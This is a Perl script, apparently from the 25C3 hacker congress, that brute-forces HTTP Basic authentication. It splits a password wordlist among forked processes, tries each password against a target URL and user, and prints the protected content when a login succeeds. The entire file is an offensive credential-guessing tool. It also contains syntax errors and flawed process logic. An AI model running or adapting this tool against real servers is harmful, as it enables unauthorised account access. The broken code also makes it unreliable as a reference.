#!/usr/bin/perl
# telmich / !eof
# 25C3

use strict;
use warnings;
use LWP;
use File::Temp qw/ tempfile tempdir /;

if ($#ARGV < 2 || $#ARGV > 3) {
   die("Gib mir Essen, aber nicht zu viel!");
}

# ARGV / pid
my $url = shift;
my $realm = shift;
my $user = shift;
my $worte = shift;
my $ppid = $$;

# standard values
my $ua = LWP::UserAgent->new;
   $ua->agent("C3/25");

my $concurrent = 2;
my $per_process = 0;
my $last_process = 0;
my $tempdir;
my @children;


my $domain = $url;
   $domain =~ s,.*://,,;
   $domain =~ s,/.*,,;


################################################################################
#
# Functions
#

sub child
{
   my $instance = $_[0];
   my $filename = $tempdir . "/" . $instance;
   print "Child: " , $filename, " (" , $$, ":", $ppid, ")\n";

   open(IN,"<$filename") || die("$filename");

   while(<IN>) {
      if(try_auth($_))) {
         kill QUIT => $ppid;
      }
   }

   close(IN);

   exit 0;
}

sub forkus
{
   for(my $i = 1; $i <= $concurrent; $i++) {
      my $pid = fork();
      
      if($pid == -1) {
         print "Aiiiiiiiiyyyyyyyyy!!!!\n";
         exit 42;
      }

      if($pid == 0) {
         child $i;
      } else {
         push(@children, $pid);
      }
   }
}


sub init
{
   my $template = $ENV{'HOME'} . "/http-auth.XXXXXXXXXXXXX";
   my $tempdir = tempdir( $template, CLEANUP => 1 ) || die("$template");
   #my $tempdir = tempdir( $template ) || die("$template");

   return $tempdir;
}

sub splitfile
{
   my $lines;
   
   open(TMP,"<$worte") || die("wortliste");
   $lines++ while <TMP>;
   close(TMP);

   $per_process = int($lines / $concurrent);
   $last_process = $lines % $concurrent;

   print "C/P (L): ", $lines, "/", $per_process, "(+", $last_process,  ")\n";


   # inputfile
   open(IN2, "<$worte") || die("$worte");
   my $offset = 0;

   for(my $i = 1; $i <= $concurrent; $i++) {
      my $filename = ">$tempdir/$i";
      print "Creating $filename\n";
      open(OUT, "$filename") || die("$filename");

      my $count = 0;
      while(<IN2>) {
         my $line = $_;

         print OUT $line;
         $count++;

         # last file, read the rest
         if($i == $concurrent) {
            next;
         }

         # end for normal files
         if($count == $per_process) {
            last;
         }
      }
      
      close(OUT);
   }
   close(IN2);
}

sub try_auth
{
   my $pw = $_[0];
   chomp($pw);

   print $user, ":", $pw,  "\n";

   $ua->credentials($domain, $realm, $user, $pw); 

   my $response = $ua->get($url);
   
   if ($response->is_success) {
      die "Found", $ $response->content, "\n";
      return "found!";
   } else {
      print STDERR $response->header('WWW-Authenticate'), " ", $response->status_line, "\n";
      return "";
   }
}

sub kill_children()
{
   foreach (@children) {
      my $child = $_;
      print "Killing child: ", $_, "\n";
      kill 9 => $child;
   }
}

sub siginthandler
{
   print "Ich töte mich!!!\n";
   kill_children();

   exit(0);

}

sub sighandler
{
   # sigint = killed by user -> kill children
   # sigquit = child found password -> kill children, kill us
   $SIG{'INT'} = 'siginthandler';
   $SIG{'QUIT'} = 'siginthandler';
}

sub parent()
{
   # install signal handler:
   sighandler();

   $tempdir = init();
   print "Using ", $tempdir, "\n";

   # prepare worldlist
   splitfile();

   # start ourself with different lists, give our PID
   forkus();

   exit(0);
}

################################################################################
parent(); 



   #   $response->header('WWW-Authenticate') || 'Error accessing',
   #   "\n ", $response->status_line,
   #   "\n at $url\n Aborting"
   #   unless $response->is_success;
#my $req = HTTP::Request->new(POST => 'http://search.cpan.org/search');

#print "This is libwww-perl-$LWP::VERSION\n";
      #print $response->content;
